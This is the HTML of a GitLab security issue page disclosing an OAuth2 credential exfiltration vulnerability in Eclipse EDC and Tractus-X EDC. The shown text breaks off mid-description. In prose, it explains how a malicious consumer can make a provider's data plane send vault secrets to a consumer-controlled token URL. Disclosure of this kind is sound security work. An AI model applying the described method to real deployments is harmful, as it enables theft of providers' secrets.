





<!DOCTYPE html>
<html class="gl-light ui-neutral with-top-bar with-header with-system-footer" lang="en">
<head prefix="og: http://ogp.me/ns#">
<meta charset="utf-8">
<meta content="IE=edge" http-equiv="X-UA-Compatible">
<meta content="width=device-width, initial-scale=1" name="viewport">
<title>Eclipse EDC: OAuth2 Credential Exfiltration Vulnerability (#198) · Issues · Eclipse Projects Security / vulnerability-reports · GitLab</title>
<script>
//<![CDATA[
window.gon={};gon.api_version="v4";gon.default_avatar_url="https://gitlab.eclipse.org/assets/no_avatar-849f9c04a3a0d0cea2424ae97b27447dc64a7dbfae83c036c45b403392f0e8ba.png";gon.max_file_size=100;gon.asset_host=null;gon.webpack_public_path="/assets/webpack/";gon.relative_url_root="";gon.user_color_mode="gl-light";gon.user_color_scheme="white";gon.markdown_surround_selection=null;gon.markdown_automatic_lists=null;gon.math_rendering_limits_enabled=true;gon.recaptcha_api_server_url="https://www.recaptcha.net/recaptcha/api.js";gon.recaptcha_sitekey="";gon.gitlab_url="https://gitlab.eclipse.org";gon.promo_url="https://about.gitlab.com";gon.forum_url="https://forum.gitlab.com";gon.docs_url="https://docs.gitlab.com";gon.revision="9d81c27eee7";gon.feature_category="team_planning";gon.gitlab_logo="/assets/gitlab_logo-2957169c8ef64c58616a1ac3f4fc626e8a35ce4eb3ed31bb0d873712f2a041a0.png";gon.secure=true;gon.sprite_icons="/assets/icons-236e3b687d786d9dfe4709143a94d4c53b8d5a1f235775401e5825148297fa84.svg";gon.sprite_file_icons="/assets/file_icons/file_icons-7cd3d6c3b29a6d972895f36472978a4b5adb4b37f9b5d0716a380e82389f7e0e.svg";gon.emoji_sprites_css_path="/assets/emoji_sprites-d746ae2450a3e9c626d338d77a101b84ff33a47c0c281b676d75c4a6ed2948a4.css";gon.gridstack_css_path="/assets/lazy_bundles/gridstack-5fcfd4ffbea1db04eaf7f16521bcab19ae3af042c8b4afe8d16781eda5a70799.css";gon.test_env=false;gon.disable_animations=false;gon.suggested_label_colors={"#cc338b":"Magenta-pink","#dc143c":"Crimson","#c21e56":"Rose red","#cd5b45":"Dark coral","#ed9121":"Carrot orange","#eee600":"Titanium yellow","#009966":"Green-cyan","#8fbc8f":"Dark sea green","#6699cc":"Blue-gray","#e6e6fa":"Lavender","#9400d3":"Dark violet","#330066":"Deep violet","#36454f":"Charcoal grey","#808080":"Gray"};gon.first_day_of_week=0;gon.time_display_relative=true;gon.time_display_format=0;gon.ee=true;gon.jh=false;gon.dot_com=false;gon.uf_error_prefix="UF";gon.pat_prefix="";gon.keyboard_shortcuts_enabled=true;gon.diagramsnet_url="https://embed.diagrams.net";gon.features={"sourceEditorToolbar":false,"vscodeWebIde":true,"uiForOrganizations":false,"organizationSwitching":false,"removeMonitorMetrics":true,"workItemsViewPreference":false,"searchButtonTopRight":false,"preserveMarkdown":false,"issuesGridView":false,"serviceDeskTicket":false,"issuesListDrawer":false,"notificationsTodosButtons":false,"commentTooltips":false,"glqlIntegration":false,"issueAutocompleteBackendFiltering":false,"workItems":true,"workItemsBeta":false,"workItemsAlpha":false,"epicWidgetEditConfirmation":false,"namespaceLevelWorkItems":false,"workItemEpics":false};gon.roadmap_epics_limit=1000;gon.licensed_features={"escalationPolicies":true};gon.abilities={"summarizeComments":false};
//]]>
</script>


<script>
//<![CDATA[
var gl = window.gl || {};
gl.startup_calls = {"/security/vulnerability-reports/-/issues/198/discussions.json?per_page=20":{},"/security/vulnerability-reports/-/issues/198.json?serializer=sidebar_extras":{}};
gl.startup_graphql_calls = null;

if (gl.startup_calls && window.fetch) {
  Object.keys(gl.startup_calls).forEach(apiCall => {
   gl.startup_calls[apiCall] = {
      fetchCall: fetch(apiCall, {
        // Emulate XHR for Rails AJAX request checks
        headers: {
          'X-Requested-With': 'XMLHttpRequest'
        },
        // fetch won’t send cookies in older browsers, unless you set the credentials init option.
        // We set to `same-origin` which is default value in modern browsers.
        // See https://github.com/whatwg/fetch/pull/585 for more information.
        credentials: 'same-origin'
      })
    };
  });
}
if (gl.startup_graphql_calls && window.fetch) {
  const headers = {"X-CSRF-Token":"txVpMyLBUSCOMTFkDajK-xWaGgPJWVDhcNby5a-jj_yvfaifyy_GEbZa_zV2VlbWF6MDS34CzEKIWtxXnIgI6A","x-gitlab-feature-category":"team_planning"};
  const url = `https://gitlab.eclipse.org/api/graphql`

  const opts = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      ...headers,
    }
  };

  gl.startup_graphql_calls = gl.startup_graphql_calls.map(call => ({
    ...call,
    fetchCall: fetch(url, {
      ...opts,
      credentials: 'same-origin',
      body: JSON.stringify(call)
    })
  }))
}


//]]>
</script>



<link rel="stylesheet" href="/assets/application-8276cea79ef526c83539dd54f72382f170a49fbe45332e2f2c132a38880e38ff.css" />
<link rel="stylesheet" href="/assets/page_bundles/design_management-5915182f24062982294a7689b2e490af18508f930186330e5eb94325919258cc.css" /><link rel="stylesheet" href="/assets/page_bundles/incidents-6598dbf61fe32a8ddb1b06150f2301451ad41554975581e771efc5f890d0443f.css" /><link rel="stylesheet" href="/assets/page_bundles/issuable-013502814f58518ea802ad05cf9775f47c9933e442b9e59dd4ac2f42fd0b71cf.css" /><link rel="stylesheet" href="/assets/page_bundles/notes_shared-985467dc606e2acde1735b642c5ce237ef7e965ad1c35cf33a4c9beb2ecb05b8.css" /><link rel="stylesheet" href="/assets/page_bundles/issues_show-785541c300108b8ecf7c08fd02bd67f4d6b9d59c86918ecfbf91bae5e1c8ffa8.css" /><link rel="stylesheet" href="/assets/page_bundles/work_items-d9603c98e9259c19bbb47784abf3b63b5cb7ce8d7463608443b907773ab7197d.css" /><link rel="stylesheet" href="/assets/page_bundles/labels-3508460b8d6f839e9d60de1f2065fdaf7f057efab04cf71966acef6a86fe9b41.css" /><link rel="stylesheet" href="/assets/page_bundles/commit_description-1e2cba4dda3c7b30dd84924809020c569f1308dea51520fe1dd5d4ce31403195.css" />
<link rel="stylesheet" href="/assets/application_utilities-6e9d4ced3f78abb4b0b5d21e2c5069b8c88f8e045babafc20e3c7f57893d3ee1.css" />
<link rel="stylesheet" href="/assets/tailwind-05270112d01c5ef673f3a3a3f57249974bbc904a2fa6b327a35f12eece635a2b.css" />


<link rel="stylesheet" href="/assets/fonts-fae5d3f79948bd85f18b6513a025f863b19636e85b09a1492907eb4b1bb0557b.css" />
<link rel="stylesheet" href="/assets/highlight/themes/white-9fc2e7ab1cefbb5a525a1e1b06c04b3141c2179a6d572b1d390cf9db8def8104.css" />


<link rel="preload" href="/assets/application_utilities-6e9d4ced3f78abb4b0b5d21e2c5069b8c88f8e045babafc20e3c7f57893d3ee1.css" as="style" type="text/css">
<link rel="preload" href="/assets/application-8276cea79ef526c83539dd54f72382f170a49fbe45332e2f2c132a38880e38ff.css" as="style" type="text/css">
<link rel="preload" href="/assets/highlight/themes/white-9fc2e7ab1cefbb5a525a1e1b06c04b3141c2179a6d572b1d390cf9db8def8104.css" as="style" type="text/css">




<script src="/assets/webpack/runtime.619e248a.bundle.js" defer="defer"></script>
<script src="/assets/webpack/main.bda67b2a.chunk.js" defer="defer"></script>
<script src="/assets/webpack/10.cfcff625.chunk.js" defer="defer"></script>
<script src="/assets/webpack/12.665b0ed5.chunk.js" defer="defer"></script>
<script src="/assets/webpack/13.f9ad3ff9.chunk.js" defer="defer"></script>
<script src="/assets/webpack/14.9cea632a.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.groups.security.policies.edit-pages.groups.security.policies.new-pages.projects.blob.s-823210c2.3552e27d.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.groups.analytics.dashboards-pages.groups.harbor.repositories-pages.groups.iteration_ca-43c0ecf9.cd411fdc.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.groups.new-pages.import.gitlab_projects.new-pages.import.manifest.new-pages.projects.n-44c6c18e.ce957725.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.search.show-super_sidebar.c75bd97e.chunk.js" defer="defer"></script>
<script src="/assets/webpack/super_sidebar.5bd734bb.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.projects-pages.projects.activity-pages.projects.alert_management.details-pages.project-e1be1070.7e2fa462.chunk.js" defer="defer"></script>
<script src="/assets/webpack/pages.projects.issues.show.684d6478.chunk.js" defer="defer"></script>

<meta content="object" property="og:type">
<meta content="GitLab" property="og:site_name">
<meta content="Eclipse EDC: OAuth2 Credential Exfiltration Vulnerability (#198) · Issues · Eclipse Projects Security / vulnerability-reports · GitLab" property="og:title">
<meta content=" Basic information Project name: Eclipse EDC Project id: technology.edc  Details of the..." property="og:description">
<meta content="https://gitlab.eclipse.org/assets/twitter_card-570ddb06edf56a2312253c5872489847a0f385112ddbcd71ccfa1570febab5d2.jpg" property="og:image">
<meta content="64" property="og:image:width">
<meta content="64" property="og:image:height">
<meta content="https://gitlab.eclipse.org/security/vulnerability-reports/-/issues/198" property="og:url">
<meta content="summary" property="twitter:card">
<meta content="Eclipse EDC: OAuth2 Credential Exfiltration Vulnerability (#198) · Issues · Eclipse Projects Security / vulnerability-reports · GitLab" property="twitter:title">
<meta content=" Basic information Project name: Eclipse EDC Project id: technology.edc  Details of the..." property="twitter:description">
<meta content="https://gitlab.eclipse.org/assets/twitter_card-570ddb06edf56a2312253c5872489847a0f385112ddbcd71ccfa1570febab5d2.jpg" property="twitter:image">
<meta property="twitter:label1" content="Author"><meta property="twitter:data1" content="Tiago Lucas"><meta property="twitter:label2" content="Assignee"><meta property="twitter:data2" content="Markus Spiekermann, Daniel Miehle, Siegfried Kiermayer, Björn Roy, and Stephan Bauer">
<meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="Q3VVh78rVSboNyUhI5IIVUZxoohxlR_Z1DmCqbjlUNtbHZQrVsXCF9Bc63BYbJR4REi7wMbOg3ostawbi87Xzw" />
<meta name="csp-nonce" />
<meta name="action-cable-url" content="/-/cable" />
<link href="/-/manifest.json" rel="manifest">
<link rel="icon" type="image/png" href="/uploads/-/system/appearance/favicon/1/favicon.ico" id="favicon" data-original-href="/uploads/-/system/appearance/favicon/1/favicon.ico" />
<link rel="apple-touch-icon" type="image/x-icon" href="/assets/apple-touch-icon-b049d4bc0dd9626f31db825d61880737befc7835982586d015bded10b4435460.png" />
<link href="/search/opensearch.xml" rel="search" title="Search GitLab" type="application/opensearchdescription+xml">




<meta content=" Basic information Project name: Eclipse EDC Project id: technology.edc  Details of the..." name="description">
<meta content="#ececef" name="theme-color">
</head>

<body class="tab-width-8 gl-browser-chrome gl-platform-windows" data-group="security" data-group-full-path="security" data-namespace-id="3675" data-page="projects:issues:show" data-page-type-id="198" data-project="vulnerability-reports" data-project-full-path="security/vulnerability-reports" data-project-id="3804">
<script>
//<![CDATA[
gl = window.gl || {};
gl.GfmAutoComplete = gl.GfmAutoComplete || {};
gl.GfmAutoComplete.dataSources = {"epics":"/security/vulnerability-reports/-/autocomplete_sources/epics","iterations":"/security/vulnerability-reports/-/autocomplete_sources/iterations","vulnerabilities":"/security/vulnerability-reports/-/autocomplete_sources/vulnerabilities","members":"/security/vulnerability-reports/-/autocomplete_sources/members?type=Issue\u0026type_id=198","issues":"/security/vulnerability-reports/-/autocomplete_sources/issues","mergeRequests":"/security/vulnerability-reports/-/autocomplete_sources/merge_requests","labels":"/security/vulnerability-reports/-/autocomplete_sources/labels?type=Issue\u0026type_id=198","milestones":"/security/vulnerability-reports/-/autocomplete_sources/milestones","commands":"/security/vulnerability-reports/-/autocomplete_sources/commands?type=Issue\u0026type_id=198","snippets":"/security/vulnerability-reports/-/autocomplete_sources/snippets","contacts":"/security/vulnerability-reports/-/autocomplete_sources/contacts?type=Issue\u0026type_id=198","wikis":null};


//]]>
</script>
<script>
//<![CDATA[
gl = window.gl || {};
gl.client = {"isChrome":true,"isWindows":true};


//]]>
</script>


<header class="header-logged-out" data-testid="navbar">
<a class="gl-sr-only gl-accessibility" href="#content-body">Skip to content</a>
<div class="container-fluid">
<nav aria-label="Explore GitLab" class="header-logged-out-nav gl-flex gl-gap-3 gl-justify-between">
<div class="gl-flex gl-items-center gl-gap-1">
<span class="gl-sr-only">GitLab</span>
<a title="Homepage" id="logo" class="header-logged-out-logo has-tooltip" aria-label="Homepage" href="/"><img class="brand-header-logo lazy" alt="" data-src="/uploads/-/system/appearance/header_logo/1/ef_logis.png" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" />
</a></div>
<ul class="gl-list-none gl-p-0 gl-m-0 gl-flex gl-gap-3 gl-items-center gl-grow">
<li class="header-logged-out-nav-item">
<a class="" href="/explore">Explore</a>
</li>
</ul>
<ul class="gl-list-none gl-p-0 gl-m-0 gl-flex gl-gap-3 gl-items-center gl-justify-end">
<li class="header-logged-out-nav-item">
<a href="/users/sign_in?redirect_to_referer=yes">Sign in</a>
</li>
</ul>
</nav>
</div>
</header>

<div class="layout-page page-gutter right-sidebar-expanded page-with-super-sidebar">
<aside class="js-super-sidebar super-sidebar super-sidebar-loading" data-command-palette="{&quot;project_files_url&quot;:&quot;/security/vulnerability-reports/-/files/main?format=json&quot;,&quot;project_blob_url&quot;:&quot;/security/vulnerability-reports/-/blob/main&quot;}" data-force-desktop-expanded-sidebar="" data-is-saas="false" data-root-path="/" data-sidebar="{&quot;is_logged_in&quot;:false,&quot;context_switcher_links&quot;:[{&quot;title&quot;:&quot;Explore&quot;,&quot;link&quot;:&quot;/explore&quot;,&quot;icon&quot;:&quot;compass&quot;}],&quot;current_menu_items&quot;:[{&quot;id&quot;:&quot;project_overview&quot;,&quot;title&quot;:&quot;vulnerability-reports&quot;,&quot;icon&quot;:null,&quot;avatar&quot;:null,&quot;entity_id&quot;:3804,&quot;link&quot;:&quot;/security/vulnerability-reports&quot;,&quot;pill_count&quot;:null,&quot;link_classes&quot;:&quot;shortcuts-project&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;manage_menu&quot;,&quot;title&quot;:&quot;Manage&quot;,&quot;icon&quot;:&quot;users&quot;,&quot;avatar&quot;:null,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;entity_id&quot;:null,&quot;link&quot;:&quot;/security/vulnerability-reports/activity&quot;,&quot;is_active&quot;:false,&quot;pill_count&quot;:null,&quot;items&quot;:[{&quot;id&quot;:&quot;activity&quot;,&quot;title&quot;:&quot;Activity&quot;,&quot;icon&quot;:null,&quot;avatar&quot;:null,&quot;entity_id&quot;:null,&quot;link&quot;:&quot;/security/vulnerability-reports/activity&quot;,&quot;pill_count&quot;:null,&quot;link_classes&quot;:&quot;shortcuts-project-activity&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;members&quot;,&quot;title&quot;:&quot;Members&quot;,&quot;icon&quot;:null,&quot;avatar&quot;:null,&quot;entity_id&quot;:null,&quot;link&quot;:&quot;/security/vulnerability-reports/-/project_members&quot;,&quot;pill_count&quot;:null,&quot;link_classes&quot;:null,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;labels&quot;,&quot;title&quot;:&quot;Labels&quot;,&quot;icon&quot;:null,&quot;avatar&quot;:null,&quot;entity_id&quot;:null,&quot;link&quot;:&quot;/security/vulnerability-reports/-/labels&quot;,&quot;pill_count&quot;:null,&quot;link_classes&quot;:null,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;plan_menu&quot;,&quot;title&quot;:&quot;Plan&quot;,&quot;icon&quot;:&quot;planning&quot;,&quot;avatar&quot;:null,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;entity_id&quot;:null,&quot;link&quot;:&quot;/security/vulnerability-reports/-/issues&quot;,&quot;is_active&quot;:true,&quot;pill_count&quot;:null,&quot;items&quot;:[{&quot;id&quot;:&quot;project_issue_list&quot;,&quot;title&quot;:&quot;Issues&quot;,&quot;icon&quot;:null,&quot;avatar&quot;:null,&quot;entity_id&quot;:null,&quot;link&quot;:&quot;/security/vulnerability-reports/-/issues&quot;,&quot;pill_count&quot;:&quot;0&quot;,&quot;link_classes&quot;:&quot;shortcuts-issues has-sub-items&quot;,&quot;is_active&quot;:true},{&quot;id&quot;:&quot;boards&quot;,&quot;title&quot;:&quot;Issue boards&quot;,&quot;icon&quot;:null,&quot;avatar&quot;:null,&quot;entity_id&quot;:null,&quot;link&quot;:&quot;/security/vulnerability-reports/-/boards&quot;,&quot;pill_count&quot;:null,&quot;link_classes&quot;:&quot;shortcuts-issue-boards&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;milestones&quot;,&quot;title&quot;:&quot;Milestones&quot;,&quot;icon&quot;:null,&quot;avatar&quot;:null,&quot;entity_id&quot;:null,&quot;link&quot;:&quot;/security/vulnerability-reports/-/milestones&quot;,&quot;pill_count&quot;:null,&quot;link_classes&quot;:null,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;iterations&quot;,&quot;title&quot;:&quot;Iterations&quot;,&quot;icon&quot;:null,&quot;avatar&quot;:null,&quot;entity_id&quot;:null,&quot;link&quot;:&quot;/security/vulnerability-reports/-/cadences&quot;,&quot;pill_count&quot;:null,&quot;link_classes&quot;:null,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;deploy_menu&quot;,&quot;title&quot;:&quot;Deploy&quot;,&quot;icon&quot;:&quot;deployments&quot;,&quot;avatar&quot;:null,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;entity_id&quot;:null,&quot;link&quot;:&quot;/security/vulnerability-reports/-/ml/models&quot;,&quot;is_active&quot;:false,&quot;pill_count&quot;:null,&quot;items&quot;:[{&quot;id&quot;:&quot;model_registry&quot;,&quot;title&quot;:&quot;Model registry&quot;,&quot;icon&quot;:null,&quot;avatar&quot;:null,&quot;entity_id&quot;:null,&quot;link&quot;:&quot;/security/vulnerability-reports/-/ml/models&quot;,&quot;pill_count&quot;:null,&quot;link_classes&quot;:null,&quot;is_active&quot;:false}],&quot;separated&quot;:false}],&quot;current_context_header&quot;:&quot;Project&quot;,&quot;support_path&quot;:&quot;https://wiki.eclipse.org/Gitlab&quot;,&quot;docs_path&quot;:&quot;/help/docs&quot;,&quot;display_whats_new&quot;:false,&quot;show_version_check&quot;:false,&quot;search&quot;:{&quot;search_path&quot;:&quot;/search&quot;,&quot;issues_path&quot;:&quot;/dashboard/issues&quot;,&quot;mr_path&quot;:&quot;/dashboard/merge_requests&quot;,&quot;autocomplete_path&quot;:&quot;/search/autocomplete&quot;,&quot;settings_path&quot;:&quot;/search/settings&quot;,&quot;search_context&quot;:{&quot;group&quot;:{&quot;id&quot;:3675,&quot;name&quot;:&quot;Eclipse Projects Security&quot;,&quot;full_name&quot;:&quot;Eclipse Projects Security&quot;},&quot;group_metadata&quot;:{&quot;issues_path&quot;:&quot;/groups/security/-/issues&quot;,&quot;mr_path&quot;:&quot;/groups/security/-/merge_requests&quot;},&quot;project&quot;:{&quot;id&quot;:3804,&quot;name&quot;:&quot;vulnerability-reports&quot;},&quot;project_metadata&quot;:{&quot;mr_path&quot;:&quot;/security/vulnerability-reports/-/merge_requests&quot;,&quot;issues_path&quot;:&quot;/security/vulnerability-reports/-/issues&quot;},&quot;code_search&quot;:false,&quot;scope&quot;:&quot;issues&quot;,&quot;for_snippets&quot;:null}},&quot;panel_type&quot;:&quot;project&quot;,&quot;shortcut_links&quot;:[{&quot;title&quot;:&quot;Snippets&quot;,&quot;href&quot;:&quot;/explore/snippets&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-snippets&quot;},{&quot;title&quot;:&quot;Groups&quot;,&quot;href&quot;:&quot;/explore/groups&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-groups&quot;},{&quot;title&quot;:&quot;Projects&quot;,&quot;href&quot;:&quot;/explore/projects/starred&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-projects&quot;}],&quot;terms&quot;:&quot;/-/users/terms&quot;}"></aside>

<div class="content-wrapper">

<div class="broadcast-wrapper">




</div>
<div class="alert-wrapper alert-wrapper-top-space gl-flex gl-flex-col gl-gap-3 container-fluid container-limited">




























</div>
<div class="top-bar-fixed container-fluid" data-testid="top-bar">
<div class="top-bar-container gl-flex gl-items-center gl-gap-2">
<div class="gl-grow gl-basis-0 gl-flex gl-items-center gl-justify-start">
<button class="gl-button btn btn-icon btn-md btn-default btn-default-tertiary js-super-sidebar-toggle-expand super-sidebar-toggle -gl-ml-3" aria-controls="super-sidebar" aria-expanded="false" aria-label="Primary navigation sidebar" type="button"><svg class="s16 gl-icon gl-button-icon " data-testid="sidebar-icon"><use href="/assets/icons-236e3b687d786d9dfe4709143a94d4c53b8d5a1f235775401e5825148297fa84.svg#sidebar"></use></svg>

</button>
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Eclipse Projects Security","item":"https://gitlab.eclipse.org/security"},{"@type":"ListItem","position":2,"name":"vulnerability-reports","item":"https://gitlab.eclipse.org/security/vulnerability-reports"},{"@type":"ListItem","position":3,"name":"Issues","item":"https://gitlab.eclipse.org/security/vulnerability-reports/-/issues"},{"@type":"ListItem","position":4,"name":"#198","item":"https://gitlab.eclipse.org/security/vulnerability-reports/-/issues/198"}]}


</script>
<div data-testid="breadcrumb-links" id="js-vue-page-breadcrumbs-wrapper">
<div data-breadcrumbs-json="[{&quot;text&quot;:&quot;Eclipse Projects Security&quot;,&quot;href&quot;:&quot;/security&quot;,&quot;avatarPath&quot;:null},{&quot;text&quot;:&quot;vulnerability-reports&quot;,&quot;href&quot;:&quot;/security/vulnerability-reports&quot;,&quot;avatarPath&quot;:null},{&quot;text&quot;:&quot;Issues&quot;,&quot;href&quot;:&quot;/security/vulnerability-reports/-/issues&quot;,&quot;avatarPath&quot;:null},{&quot;text&quot;:&quot;#198&quot;,&quot;href&quot;:&quot;/security/vulnerability-reports/-/issues/198&quot;,&quot;avatarPath&quot;:null}]" id="js-vue-page-breadcrumbs"></div>
<div id="js-injected-page-breadcrumbs"></div>
</div>


</div>
<div class="gl-flex-none gl-flex gl-items-center gl-justify-center">
<div id="js-advanced-search-modal"></div>

</div>
<div class="gl-grow gl-basis-0 gl-flex gl-items-center gl-justify-end">
<div id="js-work-item-feedback"></div>


</div>
</div>
</div>

<div class="container-fluid container-limited limit-container-width project-highlight-puc">
<main class="content" id="content-body" itemscope itemtype="http://schema.org/SoftwareSourceCode">
<div class="flash-container flash-container-page sticky" data-testid="flash-container">
<div id="js-global-alerts"></div>
</div>







<div class="issue-details issuable-details js-issue-details">
<div class="detail-page-description content-block js-detail-page-description gl-pt-3 gl-pb-0 gl-border-none">
<div data-header-actions-data="{&quot;can_create_issue&quot;:&quot;true&quot;,&quot;can_create_incident&quot;:&quot;false&quot;,&quot;can_destroy_issue&quot;:&quot;false&quot;,&quot;can_reopen_issue&quot;:&quot;false&quot;,&quot;can_report_spam&quot;:&quot;&quot;,&quot;can_update_issue&quot;:&quot;false&quot;,&quot;is_issue_author&quot;:&quot;false&quot;,&quot;issue_path&quot;:&quot;/security/vulnerability-reports/-/issues/198&quot;,&quot;new_issue_path&quot;:&quot;/security/vulnerability-reports/-/issues/new?add_related_issue=198&quot;,&quot;project_path&quot;:&quot;security/vulnerability-reports&quot;,&quot;report_abuse_path&quot;:&quot;/-/abuse_reports/add_category&quot;,&quot;reported_user_id&quot;:2023,&quot;reported_from_url&quot;:&quot;https://gitlab.eclipse.org/security/vulnerability-reports/-/issues/198&quot;,&quot;submit_as_spam_path&quot;:&quot;/security/vulnerability-reports/-/issues/198/mark_as_spam&quot;,&quot;issuable_email_address&quot;:null,&quot;can_promote_to_epic&quot;:&quot;false&quot;}" data-initial="{&quot;endpoint&quot;:&quot;/security/vulnerability-reports/-/issues/198&quot;,&quot;updateEndpoint&quot;:&quot;/security/vulnerability-reports/-/issues/198.json&quot;,&quot;canUpdate&quot;:false,&quot;canDestroy&quot;:false,&quot;issuableRef&quot;:&quot;#198&quot;,&quot;imported&quot;:false,&quot;markdownPreviewPath&quot;:&quot;/security/vulnerability-reports/-/preview_markdown?target_id=198\u0026target_type=Issue&quot;,&quot;markdownDocsPath&quot;:&quot;/help/user/markdown.md&quot;,&quot;lockVersion&quot;:0,&quot;issuableTemplateNamesPath&quot;:&quot;/security/vulnerability-reports/description_templates/names/issue&quot;,&quot;initialTitleHtml&quot;:&quot;Eclipse EDC: OAuth2 Credential Exfiltration Vulnerability&quot;,&quot;initialTitleText&quot;:&quot;Eclipse EDC: OAuth2 Credential Exfiltration Vulnerability&quot;,&quot;initialDescriptionHtml&quot;:&quot;\u0026#x000A;\u0026#x000A;\u003ch2 data-sourcepos=\&quot;15:1-15:20\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-basic-information\&quot; class=\&quot;anchor\&quot; href=\&quot;#basic-information\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eBasic information\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;17:1-17:29\&quot; dir=\&quot;auto\&quot;\u003e\u003cstrong\u003eProject name:\u003c/strong\u003e Eclipse EDC\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;19:1-19:30\&quot; dir=\&quot;auto\&quot;\u003e\u003cstrong\u003eProject id:\u003c/strong\u003e technology.edc\u003c/p\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;21:1-21:23\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-details-of-the-issue\&quot; class=\&quot;anchor\&quot; href=\&quot;#details-of-the-issue\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eDetails of the issue\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;23:1-23:28\&quot; dir=\&quot;auto\&quot;\u003eReported on the security ML:\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;25:1-25:999\&quot; dir=\&quot;auto\&quot;\u003eWe have identified a security vulnerability in the EDC project (\u003ca href=\&quot;https://github.com/eclipse-edc/Connector\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ehttps://github.com/eclipse-edc/Connector\u003c/a\u003e) version 0.2.1 (at least down to version MS8) regarding the OAuth2-protected data sink feature which we rate with at a 9.3/10 CRITICAL CVSS v4.0 score. This project is also used in the Eclipse project (\u003ca href=\&quot;https://github.com/eclipse-tractusx/tractusx-edc\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ehttps://github.com/eclipse-tractusx/tractusx-edc\u003c/a\u003e) where we can verify the vulnerability at least for release 0.5.4. As we have identified a \u003ca href=\&quot;https://github.com/eclipse-tractusx/tractusx-edc/pull/1244\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003erecent code change\u003c/a\u003e in Tractus-X EDC that now allows to exploit the vulnerability by default, we prioritized disclosure over further deeper analysis and reproducibility of latest released versions, since we want to avoid any negative impact including reputation on the young projects and data space initiatives like Catena-X. To our opinion (concluded by a first review of the current code) the vulnerability most probably persists for Connector version 0.6.2 and Tractus-X EDC version 0.7.0\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;27:1-27:536\&quot; dir=\&quot;auto\&quot;\u003eWhen using a custom, OAuth2-protected data sink, the OAuth2-specific data address properties are resolved by the provider data plane. Problematically, the consumer-provided clientSecretKey, which indicates the OAuth2 client secret to retrieve from a secrets vault, is resolved in the context of the provider&#39;s vault, not the consumer. This secret&#39;s value is then sent to the tokenUrl, also consumer-controlled, as part of an OAuth2 client credentials grant. The returned access token is then sent as a bearer token to the data sink URL.\u003c/p\u003e\u0026#x000A;\u003ch3 data-sourcepos=\&quot;30:1-30:11\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-details\&quot; class=\&quot;anchor\&quot; href=\&quot;#details\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eDetails\u003c/h3\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;32:1-32:812\&quot; dir=\&quot;auto\&quot;\u003eThe vulnerability is twofold, but the core issue is that the provider data plane resolves clientSecretKeys specified in data sink data addresses provided by consumers. This means that a malicious consumer can induce the provider to load any known secret from the provider&#39;s vault and use it as an OAuth2 client secret, with the resulting token being sent to the consumer-controlled data sink. This alone already allows significant credential exfiltration: If a malicious consumer knows that the client secret for a known client ID is stored at a known vault key, e.g., because the provider themself has an OAuth2-protected data source, the consumer can harvest the resulting access token from their data sink and use it to authorize against such protected resource that should only be accessible by the provider.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;34:1-34:915\&quot; dir=\&quot;auto\&quot;\u003eThe second part is that the tokenUrl, to which the provider submits the resolved credentials to retrieve an access token, is also controlled by the consumer. With the previously described attack, it was only possible to exfiltrate OAuth2 access tokens, which are usually short-lived and require the attacker to know the corresponding client ID and token URL. However, by providing an attacker-controlled endpoint as the tokenUrl, the attacker can exfiltrate arbitrary secrets from the provider&#39;s vault, as the provider data plane will send the resolved secret to that endpoint as part of an OAuth2 client credentials grant. This allows exfiltration of longer-lived secrets like OAuth2 client secret, cryptographic keys, etc. Notably, compared to the first attack, an attacker needs significantly less information to conduct this attack; they only need to know the desired secret&#39;s name (\&quot;key\&quot;) in the secrets vault.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;36:1-37:21\&quot; dir=\&quot;auto\&quot;\u003eThe latter problem is exacerbated by the fact that third-party integrations, like the \u003ca 